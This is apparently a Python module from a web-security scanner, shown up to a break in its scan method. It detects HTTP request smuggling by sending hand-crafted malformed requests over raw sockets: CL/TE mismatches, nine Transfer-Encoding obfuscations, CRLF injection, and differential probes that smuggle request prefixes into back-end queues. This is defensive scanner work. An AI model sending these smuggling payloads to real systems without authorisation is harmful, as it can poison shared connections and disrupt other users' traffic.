# modules/http_smuggling_probe.py
import re
import os
import ssl
import time
import uuid
import socket
import struct
import hashlib
import logging
import threading
import urllib.parse
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Smuggling variant catalogue
# ---------------------------------------------------------------------------
#
# HTTP request smuggling arises when a front-end (CDN/LB) and back-end server
# disagree on where one HTTP request ends and the next begins.
#
# Four canonical variants:
#
#   CL.TE  — front-end trusts Content-Length, back-end trusts Transfer-Encoding
#   TE.CL  — front-end trusts Transfer-Encoding, back-end trusts Content-Length
#   TE.TE  — both trust Transfer-Encoding but one can be obfuscated
#   H2.CL  — HTTP/2 front-end, HTTP/1.1 back-end; CL injected via H2 header
#
# Detection strategy for each:
#
#   CL.TE  timing  — CL says body is N bytes; TE body is 0\r\n\r\n (empty chunk).
#                    Back-end waits for missing CL bytes → delayed response.
#   CL.TE  diff    — Prefix a smuggled G request; a 2nd normal request gets
#                    405/400 (back-end sees "GPOST").
#   TE.CL  timing  — TE body has non-terminal chunk; CL says 0.
#                    Back-end waits for missing TE data → delayed response.
#   TE.CL  diff    — Similar differential approach with smuggled prefix.
#   TE.TE  obfusc  — Send two TE headers with obfuscated value; one side
#                    ignores the bad one, the other processes it.
#   H2.CL  —        Inject CL header in HTTP/2 request via pseudo-header
#                    smuggling (detected passively via response anomalies).
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------

@dataclass
class SmuggleProbe:
    """Definition of one smuggling probe to send."""
    variant:        str           # CL.TE / TE.CL / TE.TE / H2.CL
    technique:      str           # timing / differential / obfuscation
    label:          str
    severity:       str
    description:    str
    # Raw request bytes — built at probe time with per-probe canary
    # (stored as a template function reference, called in _build_raw_request)
    builder:        str           # name of builder function


@dataclass
class SmuggleResult:
    variant:        str
    technique:      str
    label:          str
    severity:       str
    target_url:     str
    endpoint:       str
    # Timing probe fields
    baseline_ms:    Optional[float]
    probe_ms:       Optional[float]
    timing_delta_ms:Optional[float]
    timing_anomaly: bool
    # Differential probe fields
    differential_status:  Optional[int]
    differential_body:    Optional[str]
    differential_anomaly: bool
    # Combined verdict
    vulnerable:     bool
    confidence:     str           # confirmed / likely / potential
    evidence:       str
    canary:         str


@dataclass
class PipelineFingerprint:
    """HTTP pipeline and server fingerprint gathered before probing."""
    server_header:    Optional[str]
    via_header:       Optional[str]
    x_powered_by:     Optional[str]
    supports_http11:  bool
    supports_chunked: bool
    connection_close: bool
    keep_alive_max:   Optional[int]
    cdn_layer:        Optional[str]
    has_te_header:    bool          # server echoes TE in response


@dataclass
class ScanState:
    target_url:   str
    host:         str
    port:         int
    tls:          bool
    path:         str
    fingerprint:  Optional[PipelineFingerprint]
    results:      List[SmuggleResult] = field(default_factory=list)
    lock:         threading.Lock      = field(default_factory=threading.Lock)


# ---------------------------------------------------------------------------
# Raw TCP / TLS socket layer
# ---------------------------------------------------------------------------

class _RawConn:
    """
    Minimal raw TCP/TLS connection that bypasses the requests session so we
    can send precisely crafted bytes — including malformed CL/TE combinations
    that an HTTP library would reject or rewrite.
    """

    def __init__(self, host: str, port: int, tls: bool, timeout: float = 10.0):
        self._host    = host
        self._port    = port
        self._tls     = tls
        self._timeout = timeout
        self._sock: Optional[socket.socket] = None

    def connect(self) -> None:
        raw = socket.create_connection((self._host, self._port), timeout=self._timeout)
        if self._tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            raw = ctx.wrap_socket(raw, server_hostname=self._host)
        raw.settimeout(self._timeout)
        self._sock = raw

    def send(self, data: bytes) -> None:
        if not self._sock:
            raise RuntimeError("not connected")
        self._sock.sendall(data)

    def recv_until_headers(self, timeout: Optional[float] = None) -> bytes:
        """Read until \\r\\n\\r\\n (end of response headers)."""
        if not self._sock:
            return b""
        if timeout:
            self._sock.settimeout(timeout)
        buf = b""
        try:
            while b"\r\n\r\n" not in buf:
                chunk = self._sock.recv(4096)
                if not chunk:
                    break
                buf += chunk
        except socket.timeout:
            pass
        except OSError:
            pass
        return buf

    def recv_body(self, max_bytes: int = 8192, timeout: float = 3.0) -> bytes:
        """Read up to max_bytes of body after headers have been consumed."""
        if not self._sock:
            return b""
        self._sock.settimeout(timeout)
        buf = b""
        try:
            while len(buf) < max_bytes:
                chunk = self._sock.recv(min(4096, max_bytes - len(buf)))
                if not chunk:
                    break
                buf += chunk
        except socket.timeout:
            pass
        except OSError:
            pass
        return buf

    def recv_all(self, timeout: float = 5.0) -> bytes:
        """Read everything available within timeout."""
        if not self._sock:
            return b""
        self._sock.settimeout(timeout)
        buf = b""
        try:
            while True:
                chunk = self._sock.recv(4096)
                if not chunk:
                    break
                buf += chunk
        except socket.timeout:
            pass
        except OSError:
            pass
        return buf

    def close(self) -> None:
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass
            self._sock = None


def _parse_status(raw: bytes) -> int:
    """Extract HTTP status code from raw response bytes."""
    try:
        line = raw.split(b"\r\n", 1)[0].decode("utf-8", errors="replace")
        return int(line.split(" ", 2)[1])
    except (IndexError, ValueError):
        return 0


def _parse_headers(raw: bytes) -> Dict[str, str]:
    """Parse response headers from raw bytes into a dict."""
    headers: Dict[str, str] = {}
    try:
        head = raw.split(b"\r\n\r\n", 1)[0]
        for line in head.split(b"\r\n")[1:]:
            decoded = line.decode("utf-8", errors="replace")
            if ":" in decoded:
                k, _, v = decoded.partition(":")
                headers[k.strip().lower()] = v.strip()
    except Exception:
        pass
    return headers


def _extract_body_snippet(raw: bytes, max_len: int = 300) -> str:
    """Return printable snippet of response body."""
    parts = raw.split(b"\r\n\r\n", 1)
    body  = parts[1] if len(parts) > 1 else b""
    return body[:max_len].decode("utf-8", errors="replace")


# ---------------------------------------------------------------------------
# Request builders — each returns raw bytes ready to send
# ---------------------------------------------------------------------------

_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0"


def _base_headers(host: str, path: str, extra: Dict[str, str]) -> str:
    """Build the common HTTP/1.1 header block (without body)."""
    hdrs = {
        "Host":            host,
        "User-Agent":      _UA,
        "Connection":      "keep-alive",
        "Accept":          "*/*",
    }
    hdrs.update(extra)
    lines = [f"POST {path} HTTP/1.1"]
    for k, v in hdrs.items():
        lines.append(f"{k}: {v}")
    return "\r\n".join(lines)


# ── CL.TE timing probe ─────────────────────────────────────────────────────
# Content-Length says the body is 6 bytes.
# Transfer-Encoding: chunked body is "0\r\n\r\n" (5 bytes).
# If back-end uses TE, it finishes at the empty chunk.
# If back-end uses CL, it waits for 1 more byte → timeout.
# A 5-6 second delay confirms TE-aware back-end disagrees with CL front-end.

def _build_clte_timing(host: str, path: str, canary: str) -> bytes:
    body = b"0\r\n\r\n"       # empty chunk — TE body complete
    cl   = len(body) + 1       # CL deliberately 1 byte longer → back-end stalls
    hdr  = _base_headers(host, path, {
        "Content-Type":    "application/x-www-form-urlencoded",
        "Content-Length":  str(cl),
        "Transfer-Encoding": "chunked",
        "X-Canary":        canary,
    })
    return (hdr + "\r\n\r\n").encode() + body


# ── CL.TE differential probe ──────────────────────────────────────────────
# Smuggle a partial "GPOST / HTTP/1.1" prefix into the back-end's request buffer.
# A subsequent normal GET/POST to the same connection gets prepended with "G"
# → back-end returns 405 / 400 / "Unrecognised method".

def _build_clte_differential(host: str, path: str, canary: str) -> bytes:
    smuggled_prefix = f"GPOST /{canary} HTTP/1.1\r\nFoo: x"
    chunk_size      = len(smuggled_prefix)
    body = f"{chunk_size:x}\r\n{smuggled_prefix}\r\n0\r\n\r\n"
    cl   = 4   # only "tells" front-end about the first 4 bytes → remainder smuggled
    hdr  = _base_headers(host, path, {
        "Content-Type":    "application/x-www-form-urlencoded",
        "Content-Length":  str(cl),
        "Transfer-Encoding": "chunked",
        "X-Canary":        canary,
    })
    return (hdr + "\r\n\r\n").encode() + body.encode()


# ── Follow-up request for differential detection ──────────────────────────

def _build_normal_get(host: str, path: str, canary: str) -> bytes:
    hdr = (
        f"GET /{canary}-followup HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {_UA}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )
    return hdr.encode()


# ── TE.CL timing probe ─────────────────────────────────────────────────────
# Transfer-Encoding: chunked body has a chunk that is NOT terminated.
# Content-Length: 4 (only covers "1\r\n").
# Back-end (CL-aware) finishes after 4 bytes.
# Front-end (TE-aware) forwards the full stream including the unterminated chunk.
# Back-end waits for the missing chunk terminator → stall.

def _build_tecl_timing(host: str, path: str, canary: str) -> bytes:
    # Body: chunk size 1, one data byte "Z", then no terminating "0\r\n\r\n"
    body = b"1\r\nZ\r\n"
    cl   = 4   # covers "1\r\n" only — back-end finishes at CL, TE path stalls
    hdr  = _base_headers(host, path, {
        "Content-Type":    "application/x-www-form-urlencoded",
        "Content-Length":  str(cl),
        "Transfer-Encoding": "chunked",
        "X-Canary":        canary,
    })
    return (hdr + "\r\n\r\n").encode() + body


# ── TE.CL differential probe ──────────────────────────────────────────────
# CL is set to match the first chunk header.  Remaining chunk data with the
# smuggled prefix is left for the back-end's next request slot.

def _build_tecl_differential(host: str, path: str, canary: str) -> bytes:
    smuggled = f"POST /{canary}-smuggled HTTP/1.1\r\nContent-Length: 15\r\n\r\nsmuggled_body=1\r\n"
    slen     = len(smuggled)
    body     = f"{slen:x}\r\n{smuggled}\r\n0\r\n\r\n"
    cl       = slen + len(f"{slen:x}\r\n") + len("\r\n0\r\n\r\n")
    hdr      = _base_headers(host, path, {
        "Content-Type":    "application/x-www-form-urlencoded",
        "Content-Length":  str(cl),
        "Transfer-Encoding": "chunked",
        "X-Canary":        canary,
    })
    return (hdr + "\r\n\r\n").encode() + body.encode()


# ── TE.TE obfuscation probes ──────────────────────────────────────────────
# Send two Transfer-Encoding headers. RFC 7230 says to use the last one;
# some proxies use the first; some reject the second if malformed.
# When front-end processes "chunked" and back-end ignores "xchunked" (or vice
# versa), the disagreement creates a smuggling window.

def _build_tete_obfusc_variants(host: str, path: str, canary: str) -> List[Tuple[str, bytes]]:
    """Return multiple TE.TE obfuscation payloads, each with a distinct label."""
    base_body = b"0\r\n\r\n"
    variants: List[Tuple[str, bytes]] = []

    obfuscations = [
        # (label, TE header value(s))
        ("tete-xchunked",
         "Transfer-Encoding: xchunked\r\nTransfer-Encoding: chunked"),
        ("tete-space-chunked",
         "Transfer-Encoding: chunked\r\nTransfer-Encoding: x"),
        ("tete-tab",
         "Transfer-Encoding:\tchunked"),
        ("tete-null",
         "Transfer-Encoding: chunked\r\nTransfer-Encoding: \x00chunked"),
        ("tete-quoted",
         'Transfer-Encoding: "chunked"'),
        ("tete-uppercase",
         "Transfer-Encoding: CHUNKED"),
        ("tete-obfusc-identity",
         "Transfer-Encoding: identity, chunked"),
        ("tete-trailing-space",
         "Transfer-Encoding: chunked "),
        ("tete-obfusc-extension",
         "Transfer-Encoding: chunked;x=x"),
    ]

    for label, te_header in obfuscations:
        hdr = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {_UA}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(base_body)}\r\n"
            f"{te_header}\r\n"
            f"Connection: keep-alive\r\n"
            f"X-Canary: {canary}\r\n"
            f"\r\n"
        )
        variants.append((label, hdr.encode() + base_body))

    return variants


# ── H2.TE header injection (passive heuristic) ────────────────────────────
# We can't send real HTTP/2 frames here, but we can craft an HTTP/1.1 request
# that mimics what a misconfigured H2→H1 downgrade would produce:
# an injected TE header in the request body that some proxies forward verbatim.

def _build_h2te_simulation(host: str, path: str, canary: str) -> bytes:
    """
    Simulate the class of requests a vulnerable H2→H1 proxy might forward.
    Inject TE header via a header that some proxies forward without sanitising.
    """
    hdr = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {_UA}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 5\r\n"
        # Inject via pseudo-header simulation: some H2→H1 downgrade proxies
        # forward the :method line verbatim, allowing CR injection.
        f"X-Forwarded-For: 127.0.0.1\r\nTransfer-Encoding: chunked\r\nX-Pad: a\r\n"
        f"X-Canary: {canary}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"0\r\n\r\n"
    )
    return hdr.encode()


# ── CRLF / header injection in request line ───────────────────────────────

def _build_crlf_path_inject(host: str, path: str, canary: str) -> bytes:
    """
    Inject CRLF into the request path.  Vulnerable proxies may treat the
    injected headers as separate request components, feeding the back-end
    a malformed request that it interprets as smuggled.
    """
    injected_path = (
        f"{path}%0d%0a"
        f"Transfer-Encoding:%20chunked%0d%0a"
        f"X-Injected-{canary}:%20present"
    )
    hdr = (
        f"GET {injected_path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {_UA}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )
    return hdr.encode()


# ── Chunked encoding ambiguity probes ─────────────────────────────────────

def _build_chunk_ext_inject(host: str, path: str, canary: str) -> bytes:
    """
    Use chunk extensions to smuggle data: some proxies strip extensions,
    others forward them, creating length disagreements.
    """
    # Chunk with extension that encodes a hidden CL
    body = f"5;x=\r\nHello\r\n0\r\n\r\n"
    hdr  = _base_headers(host, path, {
        "Content-Type":    "application/x-www-form-urlencoded",
        "Content-Length":  "5",
        "Transfer-Encoding": "chunked",
        "X-Canary":        canary,
    })
    return (hdr + "\r\n\r\n").encode() + body.encode()


def _build_cl_zero_te(host: str, path: str, canary: str) -> bytes:
    """
    CL=0 + TE:chunked.  Front-end (CL) sees empty body and closes.
    Back-end (TE) reads the chunked body — data smuggled into next slot.
    """
    body = f"POST /{canary}-poison HTTP/1.1\r\nHost: {host}\r\nContent-Length: 0\r\n\r\n"
    cl   = 0
    hdr  = _base_headers(host, path, {
        "Content-Type":    "application/x-www-form-urlencoded",
        "Content-Length":  str(cl),
        "Transfer-Encoding": "chunked",
        "X-Canary":        canary,
    })
    return (hdr + "\r\n\r\n").encode() + f"{len(body):x}\r\n{body}\r\n0\r\n\r\n".encode()


# ---------------------------------------------------------------------------
# Timing measurement helpers
# ---------------------------------------------------------------------------

_TIMING_THRESHOLD_MS = 4500   # ms — response delayed by this much → anomaly
_TIMING_BASELINE_MS  = 500    # expected normal response time upper bound


def _timed_send_recv(
    host: str,
    port: int,
    tls: bool,
    payload: bytes,
    recv_timeout: float = 8.0,
) -> Tuple[float, bytes]:
    """
    Open fresh connection, send *payload*, measure time to first response byte.
    Returns (elapsed_ms, raw_response_bytes).
    """
    conn = _RawConn(host, port, tls, timeout=recv_timeout)
    t0   = time.monotonic()
    try:
        conn.connect()
        conn.send(payload)
        resp = conn.recv_until_headers(timeout=recv_timeout)
        resp += conn.recv_body(max_bytes=4096, timeout=2.0)
    except Exception as exc:
        logger.debug(f"[smuggle] timed_send_recv error: {exc}")
        resp = b""
    finally:
        elapsed_ms = (time.monotonic() - t0) * 1000
        conn.close()

    return elapsed_ms, resp


def _measure_baseline(
    host: str, port: int, tls: bool, path: str, samples: int = 2
) -> float:
    """
    Send *samples* normal GET requests and return the average response time (ms).
    Used to calibrate the timing threshold per target.
    """
    total_ms = 0.0
    for _ in range(samples):
        req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {_UA}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()
        elapsed_ms, _ = _timed_send_recv(host, port, tls, req, recv_timeout=6.0)
        total_ms += elapsed_ms
        time.sleep(0.3)
    return total_ms / samples


# ---------------------------------------------------------------------------
# Pipeline fingerprinting
# ---------------------------------------------------------------------------

_CDN_HEADERS = {
    "CF-Ray":           "Cloudflare",
    "X-Served-By":      "Fastly",
    "X-Varnish":        "Varnish",
    "X-Amz-Cf-Id":     "CloudFront",
    "X-Azure-Ref":      "Azure CDN",
    "Fastly-Debug":     "Fastly",
    "X-Cache":          "Generic CDN",
    "Via":              "Proxy/CDN",
}


def _fingerprint_pipeline(
    session: requests.Session,
    target_url: str,
    timeout: float,
) -> PipelineFingerprint:
    """
    Send a normal GET request and extract pipeline-relevant response headers.
    """
    try:
        resp = session.get(target_url, timeout=timeout, allow_redirects=False)
        hdrs = {k.lower(): v for k, v in resp.headers.items()}
    except requests.RequestException:
        return PipelineFingerprint(
            server_header=None, via_header=None, x_powered_by=None,
            supports_http11=False, supports_chunked=False,
            connection_close=False, keep_alive_max=None,
            cdn_layer=None, has_te_header=False,
        )

    cdn_layer: Optional[str] = None
    for hdr, cdn in _CDN_HEADERS.items():
        if hdr.lower() in hdrs:
            cdn_layer = cdn
            break

    ka_max: Optional[int] = None
    ka_raw = hdrs.get("keep-alive", "")
    m = re.search(r"max=(\d+)", ka_raw)
    if m:
        ka_max = int(m.group(1))

    return PipelineFingerprint(
        server_header=hdrs.get("server"),
        via_header=hdrs.get("via"),
        x_powered_by=hdrs.get("x-powered-by"),
        supports_http11="HTTP/1.1" in resp.raw.version
            if hasattr(resp.raw, "version") else True,
        supports_chunked="chunked" in hdrs.get("transfer-encoding", "").lower(),
        connection_close="close" in hdrs.get("connection", "").lower(),
        keep_alive_max=ka_max,
        cdn_layer=cdn_layer,
        has_te_header="te" in hdrs,
    )


# ---------------------------------------------------------------------------
# Individual probe runners
# ---------------------------------------------------------------------------

def _run_timing_probe(
    state: ScanState,
    label: str,
    variant: str,
    severity: str,
    description: str,
    payload: bytes,
    baseline_ms: float,
    rate_delay: float,
) -> SmuggleResult:
    """
    Send the probe and measure response latency.
    A delay significantly above baseline signals timing anomaly.
    """
    if rate_delay > 0:
        time.sleep(rate_delay)

    canary = "ARTEX" + uuid.uuid4().hex[:8].upper()
    # Inject canary into payload (replace placeholder)
    payload_with_canary = payload.replace(b"__CANARY__", canary.encode())

    elapsed_ms, raw_resp = _timed_send_recv(
        state.host, state.port, state.tls,
        payload_with_canary,
        recv_timeout=9.0,
    )

    delta       = elapsed_ms - baseline_ms
    anomaly     = delta >= _TIMING_THRESHOLD_MS
    status      = _parse_status(raw_resp)
    body_snip   = _extract_body_snippet(raw_resp)

    return SmuggleResult(
        variant=variant,
        technique="timing",
        label=label,
        severity=severity if anomaly else "info",
        target_url=state.target_url,
        endpoint=state.path,
        baseline_ms=round(baseline_ms, 1),
        probe_ms=round(elapsed_ms, 1),
        timing_delta_ms=round(delta, 1),
        timing_anomaly=anomaly,
        differential_status=status,
        differential_body=body_snip[:200],
        differential_anomaly=False,
        vulnerable=anomaly,
        confidence="likely" if anomaly else "none",
        evidence=(
            f"probe={elapsed_ms:.0f}ms baseline={baseline_ms:.0f}ms "
            f"delta={delta:.0f}ms (threshold={_TIMING_THRESHOLD_MS}ms)"
            if anomaly else f"no delay detected ({delta:.0f}ms delta)"
        ),
        canary=canary,
    )


def _run_differential_probe(
    state: ScanState,
    label: str,
    variant: str,
    severity: str,
    description: str,
    poison_payload: bytes,
    followup_payload: bytes,
    rate_delay: float,
) -> SmuggleResult:
    """
    Two-request differential probe on a single keep-alive connection.
    Request 1: poison the back-end buffer.
    Request 2: normal request — if back-end sees the smuggled prefix, it
               returns a 4xx / "Unrecognised method" / echo of canary.
    """
    if rate_delay > 0:
        time.sleep(rate_delay)

    canary   = "ARTEX" + uuid.uuid4().hex[:8].upper()
    poison   = poison_payload.replace(b"__CANARY__", canary.encode())
    followup = followup_payload.replace(b"__CANARY__", canary.encode())

    conn = _RawConn(state.host, state.port, state.tls, timeout=8.0)
    t0 = time.monotonic()

    r1_raw = b""
    r2_raw = b""
    try:
        conn.connect()
        conn.send(poison)
        r1_raw = conn.recv_until_headers(timeout=5.0)
        r1_raw += conn.recv_body(max_bytes=2048, timeout=2.0)
        # Short pause to let back-end buffer the smuggled prefix
        time.sleep(0.3)
        conn.send(followup)
        r2_raw = conn.recv_all(timeout=5.0)
    except Exception as exc:
        logger.debug(f"[smuggle] differential probe error: {exc}")
    finally:
        conn.close()

    elapsed_ms = (time.monotonic() - t0) * 1000

    r1_status  = _parse_status(r1_raw)
    r2_status  = _parse_status(r2_raw)
    r2_body    = _extract_body_snippet(r2_raw)

    # Differential anomaly indicators:
    #  - Canary appears in second response body
    #  - Second response has unexpected 4xx/5xx (caused by malformed smuggled prefix)
    #  - Response contains "Unrecognised method" / "Bad request" / method error
    _ANOMALY_STATUS  = {400, 403, 405, 500, 501}
    _ANOMALY_BODY    = re.compile(
        r"(unrecognised method|unknown method|bad request|invalid request|"
        r"method not allowed|smuggl|GPOST|GGET|Invalid HTTP)",
        re.I,
    )

    canary_in_r2 = canary.upper() in r2_body.upper()
    status_anomaly = r2_status in _ANOMALY_STATUS and r1_status not in _ANOMALY_STATUS
    body_anomaly   = bool(_ANOMALY_BODY.search(r2_body))
    differential   = canary_in_r2 or status_anomaly or body_anomaly

    if differential:
        if canary_in_r2:
            confidence = "confirmed"
            evidence   = f"canary '{canary}' reflected in follow-up response body"
        elif status_anomaly:
            confidence = "likely"
            evidence   = f"r1={r1_status} r2={r2_status} (unexpected status on follow-up)"
        else:
            confidence = "potential"
            match_txt  = _ANOMALY_BODY.search(r2_body)
            evidence   = f"anomalous body: {match_txt.group(0)[:60]}" if match_txt else "body anomaly"
    else:
        confidence = "none"
        evidence   = f"r1={r1_status} r2={r2_status} no differential detected"

    return SmuggleResult(
        variant=variant,
        technique="differential",
        label=label,
        severity=severity if differential else "info",
        target_url=state.target_url,
        endpoint=state.path,
        baseline_ms=None,
        probe_ms=round(elapsed_ms, 1),
        timing_delta_ms=None,
        timing_anomaly=False,
        differential_status=r2_status,
        differential_body=r2_body[:200],
        differential_anomaly=differential,
        vulnerable=differential,
        confidence=confidence,
        evidence=evidence,
        canary=canary,
    )


def _run_tete_obfusc_probes(
    state: ScanState,
    baseline_ms: float,
    rate_delay: float,
) -> List[SmuggleResult]:
    """
    Run all TE.TE obfuscation variants — both timing and response-code checks.
    """
    results: List[SmuggleResult] = []
    variants = _build_tete_obfusc_variants(state.host, state.path, "__CANARY__")

    for label, payload in variants:
        if rate_delay > 0:
            time.sleep(rate_delay)

        canary  = "ARTEX" + uuid.uuid4().hex[:8].upper()
        p       = payload.replace(b"__CANARY__", canary.encode())

        elapsed_ms, raw_resp = _timed_send_recv(
            state.host, state.port, state.tls, p, recv_timeout=7.0
        )
        status    = _parse_status(raw_resp)
        body_snip = _extract_body_snippet(raw_resp)
        delta     = elapsed_ms - baseline_ms

        # TE.TE is confirmed if:
        # - server returns 400 (rejected obfuscated TE, treated body as opaque)
        # - OR significant timing delay
        timing_anomaly  = delta >= _TIMING_THRESHOLD_MS
        status_anomaly  = status in (400, 500) and status != 404
        vulnerable      = timing_anomaly or status_anomaly

        results.append(SmuggleResult(
            variant="TE.TE",
            technique="obfuscation",
            label=label,
            severity="high" if vulnerable else "info",
            target_url=state.target_url,
            endpoint=state.path,
            baseline_ms=round(baseline_ms, 1),
            probe_ms=round(elapsed_ms, 1),
            timing_delta_ms=round(delta, 1),
            timing_anomaly=timing_anomaly,
            differential_status=status,
            differential_body=body_snip[:200],
            differential_anomaly=status_anomaly,
            vulnerable=vulnerable,
            confidence="likely" if vulnerable else "none",
            evidence=(
                f"TE obfusc '{label}' status={status} "
                f"delta={delta:.0f}ms"
                if vulnerable else
                f"no anomaly (status={status} delta={delta:.0f}ms)"
            ),
            canary=canary,
        ))

    return results


def _run_h2te_probe(
    state: ScanState,
    rate_delay: float,
) -> SmuggleResult:
    """
    H2→H1 downgrade simulation probe via CRLF injection in headers.
    """
    if rate_delay > 0:
        time.sleep(rate_delay)

    canary  = "ARTEX" + uuid.uuid4().hex[:8].upper()
    payload = _build_h2te_simulation(state.host, state.path, canary)

    elapsed_ms, raw_resp = _timed_send_recv(
        state.host, state.port, state.tls, payload, recv_timeout=7.0
    )
    status    = _parse_status(raw_resp)
    hdrs      = _parse_headers(raw_resp)
    body_snip = _extract_body_snippet(raw_resp)

    # Evidence: injected Transfer-Encoding leaked into response somehow
    te_in_body    = "transfer-encoding" in body_snip.lower()
    canary_in_body = canary.upper() in body_snip.upper()
    # Also flag 400 on requests with TE injection — may mean proxy stripped it
    # but back-end saw something odd
    anomaly = te_in_body or canary_in_body or status == 400

    return SmuggleResult(
        variant="H2.TE",
        technique="header_injection",
        label="h2te-crlf-simulation",
        severity="high" if anomaly else "info",
        target_url=state.target_url,
        endpoint=state.path,
        baseline_ms=None,
        probe_ms=round(elapsed_ms, 1),
        timing_delta_ms=None,
        timing_anomaly=False,
        differential_status=status,
        differential_body=body_snip[:200],
        differential_anomaly=anomaly,
        vulnerable=anomaly,
        confidence="potential" if anomaly else "none",
        evidence=(
            f"H2→H1 CRLF injection: status={status} "
            + ("TE reflected in body" if te_in_body else "")
            + (f" canary reflected" if canary_in_body else "")
            if anomaly else "no anomaly"
        ),
        canary=canary,
    )


def _run_cl_zero_te_probe(
    state: ScanState,
    baseline_ms: float,
    rate_delay: float,
) -> SmuggleResult:
    if rate_delay > 0:
        time.sleep(rate_delay)

    canary  = "ARTEX" + uuid.uuid4().hex[:8].upper()
    payload = _build_cl_zero_te(state.host, state.path, canary)

    # Two-request differential: poison then follow-up
    followup = _build_normal_get(state.host, state.path, canary)
    result   = _run_differential_probe(
        state,
        label="cl-zero-te",
        variant="CL.TE",
        severity="high",
        description="CL=0 with TE:chunked body prefix smuggle",
        poison_payload=payload,
        followup_payload=followup,
        rate_delay=0,
    )
    return result


# ---------------------------------------------------------------------------
# Endpoint discovery — POST-accepting paths
# ---------------------------------------------------------------------------

_PROBE_PATHS = [
    "/", "/index.php", "/index.html", "/login", "/signin",
    "/api", "/api/v1", "/api/v2", "/api/users", "/api/login",
    "/search", "/upload", "/submit", "/contact", "/register",
    "/checkout", "/order", "/payment", "/form",
    "/wp-login.php", "/wp-admin/admin-ajax.php",
    "/xmlrpc.php", "/graphql",
]


def _find_post_endpoints(
    session: requests.Session,
    base_url: str,
    timeout: float,
) -> List[str]:
    """
    Find paths that accept POST (200/301/302/4xx but not 404).
    These are the best candidates for smuggling probes.
    """
    found: List[str] = []
    base  = base_url.rstrip("/")

    def _probe(path: str) -> Optional[str]:
        try:
            resp = session.post(
                base + path,
                data="probe=1",
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=timeout,
                allow_redirects=False,
            )
            if resp.status_code not in (404, 410, 405, 501):
                return path
        except requests.RequestException:
            pass
        return None

    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = [ex.submit(_probe, p) for p in _PROBE_PATHS]
        for f in as_completed(futures):
            r = f.result()
            if r:
                found.append(r)

    # Always include "/" as fallback
    if not found:
        found.append("/")

    return found[:5]   # cap at 5 to bound probe count


# ---------------------------------------------------------------------------
# Deduplication and severity sorting
# ---------------------------------------------------------------------------

_SEV_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}


def _dedup_sort(results: List[SmuggleResult]) -> List[SmuggleResult]:
    seen: Set[Tuple[str, str]] = set()
    unique: List[SmuggleResult] = []
    for r in results:
        key = (r.variant, r.label, r.endpoint)
        if key not in seen:
            seen.add(key)
            unique.append(r)
    unique.sort(key=lambda r: (
        0 if r.vulnerable else 1,
        _SEV_ORDER.get(r.severity, 9),
        r.variant,
    ))
    return unique


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

class HTTPSmugglingProbe:
    """
    HTTP request smuggling detector.

    Covers all four canonical smuggling variants using both timing-based
    and differential detection techniques:

      CL.TE  timing        — CL says body is N+1 bytes; TE body ends at N
      CL.TE  differential  — Smuggle GPOST prefix; follow-up gets 405/400
      TE.CL  timing        — TE body has unterminated chunk; CL says 0
      TE.CL  differential  — Smuggle POST prefix via TE; follow-up anomaly
      TE.TE  obfuscation   — 9 TE header obfuscation variants
      H2.TE  CRLF inject   — HTTP/2 downgrade simulation via CRLF injection
      CL=0 + TE            — Zero CL with chunked body prefix smuggle

    All probes use raw TCP/TLS sockets (stdlib only) to bypass HTTP library
    normalisation that would strip or rewrite the malformed headers.

    Usage in app.py:
        probe = HTTPSmugglingProbe(target_url=f"https://{domain}")
        results = probe.scan()
        scan_results[scan_id]['http_smuggling'] = results
    """

    def __init__(
        self,
        target_url: str,
        timeout: float = 9.0,
        rate_delay: float = 0.5,
        max_workers: int = 6,
        proxy: Optional[str] = None,
        skip_timing: bool = False,
        skip_differential: bool = False,
    ):
        self.target_url        = target_url.rstrip("/")
        self.timeout           = timeout
        self.rate_delay        = rate_delay
        self.max_workers       = max_workers
        self.proxy             = proxy
        self.skip_timing       = skip_timing
        self.skip_differential = skip_differential

        parsed           = urllib.parse.urlparse(self.target_url)
        self.host        = parsed.hostname or self.target_url
        self.tls         = parsed.scheme == "https"
        self.port        = parsed.port or (443 if self.tls else 80)
        self.base_path   = parsed.path or "/"

    # ------------------------------------------------------------------
    # HTTP session (for discovery + fingerprint phases only)
    # ------------------------------------------------------------------

    def _build_session(self) -> requests.Session:
        session = requests.Session()
        retry   = Retry(total=1, backoff_factor=0.2, status_forcelist=[])
        adapter = HTTPAdapter(max_retries=retry, pool_connections=5, pool_maxsize=10)
        session.mount("https://", adapter)
        session.mount("http://",  adapter)
        session.verify = False
        if self.proxy:
            session.proxies = {"http": self.proxy, "https": self.proxy}
        return session

    # ------------------------------------------------------------------
    # Public scan
    # ------------------------------------------------------------------

    def scan(self) -> Dict:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        session = self._build_session()

        print(f"[http_smuggle] target  : {self.target_url}")

        # ── Fingerprint ────────────────────────────────────────────────────
        fp = _fingerprint_pipeline(session, self.target_url, self.timeout)
        print(
